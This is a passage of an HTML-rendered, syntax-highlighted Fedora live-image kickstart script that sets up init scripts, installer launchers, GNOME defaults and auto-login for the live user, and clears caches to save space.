&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat &amp;gt; /etc/rc.d/init.d/livesys-late &amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# live: Late init script for live image&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# chkconfig: 345 99 01&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# description: Late init script for live image.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;. /etc/init.d/functions&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if ! strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; rd.live.image || [ &amp;#34;\$1&amp;#34; !&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;start&amp;#34; ] || [ -e /.liveimg-late-configured ] ; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    exit 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;exists() {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;which \$1 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;\$*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;touch /.liveimg-late-configured&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# read some variables out of /proc/cmdline&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;for o in \`cat /proc/cmdline\` ; do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;case \$o in&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;ks&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        ks=&amp;#34;--kickstart=\${o#ks=}&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        ;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    xdriver=*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        xdriver=&amp;#34;\${o#xdriver=}&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        ;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    esac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# if liveinst or textinst is given, start anaconda&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; liveinst ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;na&#34;&gt;plymouth --quit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;na&#34;&gt;/usr/sbin/liveinst \$ks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; textinst ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;na&#34;&gt;plymouth --quit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;na&#34;&gt;/usr/sbin/liveinst --text \$ks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# configure X, allowing user to override xdriver&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if [ -n &amp;#34;\$xdriver&amp;#34; ]; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;na&#34;&gt;cat &amp;gt; /etc/X11/xorg.conf.d/00-xdriver.conf &amp;lt;&amp;lt;FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;Section &amp;#34;Device&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;Identifier      &amp;#34;Videocard0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;Driver  &amp;#34;\$xdriver&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EndSection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chmod 755 /etc/rc.d/init.d/livesys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/sbin/restorecon /etc/rc.d/init.d/livesys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/sbin/chkconfig --add livesys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chmod 755 /etc/rc.d/init.d/livesys-late&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/sbin/restorecon /etc/rc.d/init.d/livesys-late&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/sbin/chkconfig --add livesys-late&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# enable tmpfs for /tmp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl enable tmp.mount&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# enable docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl enable docker.service&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# work around for poor key import UI in PackageKit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rm -f /var/lib/rpm/__db*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;releasever&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;$(rpm -q --qf &amp;#39;%{version}\n&amp;#39; --whatprovides system-release)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;basearch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;$(uname -i)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$releasever-$basearch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;echo &amp;#34;Packages within this LiveCD&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rpm -qa&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Note that running rpm recreates the rpm db files which aren&amp;#39;t needed or wanted&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rm -f /var/lib/rpm/__db*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# go ahead and pre-make the man -k cache (#455968)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/usr/bin/mandb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# save a little bit of space at least...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rm -f /boot/initramfs*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make sure there aren&amp;#39;t core files lying around&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rm -f /core*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# convince readahead not to collect&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# FIXME: for systemd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat &amp;gt;&amp;gt; /etc/rc.d/init.d/livesys &amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# disable updates plugin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat &amp;gt;&amp;gt; /usr/share/glib-2.0/schemas/org.gnome.settings-daemon.plugins.updates.gschema.override &amp;lt;&amp;lt; FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[org.gnome.settings-daemon.plugins.updates]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;active&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Show the system-config-keyboard tool on the desktop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;mkdir /home/liveuser/Desktop -p &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat /usr/share/applications/system-config-keyboard.desktop | sed &amp;#39;/NotShowIn/d&amp;#39; |sed &amp;#39;s/Terminal&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;false/Terminal=true/&amp;#39; &amp;gt; /home/liveuser/Desktop/system-config-keyboard.desktop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat /usr/share/applications/liveinst.desktop | sed &amp;#39;/NoDisplay/d&amp;#39; &amp;gt; /home/liveuser/Desktop/liveinst.desktop &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chmod +x /home/liveuser/Desktop/*.desktop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chown -R liveuser:liveuser /home/liveuser&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Liveuser face&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if [ -e /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png ] ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;cp /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png /home/liveuser/.face&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;chown liveuser:liveuser /home/liveuser/.face&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make the installer show up&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if [ -f /usr/share/applications/liveinst.desktop ]; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# Show harddisk install in shell dash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;sed -i -e &amp;#39;s/NoDisplay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;true/NoDisplay=false/&amp;#39; /usr/share/applications/liveinst.desktop 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  # need to move it to anaconda.desktop to make shell happy
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  #cp /usr/share/applications/liveinst.desktop /usr/share/applications/anaconda.desktop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;cat &amp;gt;&amp;gt; /usr/share/glib-2.0/schemas/org.gnome.shell.gschema.override &amp;lt;&amp;lt; FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[org.gnome.shell]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;favorite-apps&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;[&amp;#39;liveinst.desktop&amp;#39;,&amp;#39;firefox.desktop&amp;#39;, &amp;#39;evolution.desktop&amp;#39;, &amp;#39;empathy.desktop&amp;#39;, &amp;#39;rhythmbox.desktop&amp;#39;, &amp;#39;shotwell.desktop&amp;#39;, &amp;#39;libreoffice-writer.desktop&amp;#39;, &amp;#39;nautilus.desktop&amp;#39;, &amp;#39;gnome-documents.desktop&amp;#39;, &amp;#39;anaconda.desktop&amp;#39;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# set up auto-login&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat &amp;gt; /etc/gdm/custom.conf &amp;lt;&amp;lt; FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[daemon]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;AutomaticLoginEnable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;AutomaticLogin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;liveuser&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FOE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Turn off PackageKit-command-not-found while uninstalled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if [ -f /etc/PackageKit/CommandNotFound.conf ]; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;sed -i -e &amp;#39;s/^SoftwareSourceSearch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;true/SoftwareSourceSearch=false/&amp;#39; /etc/PackageKit/CommandNotFound.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
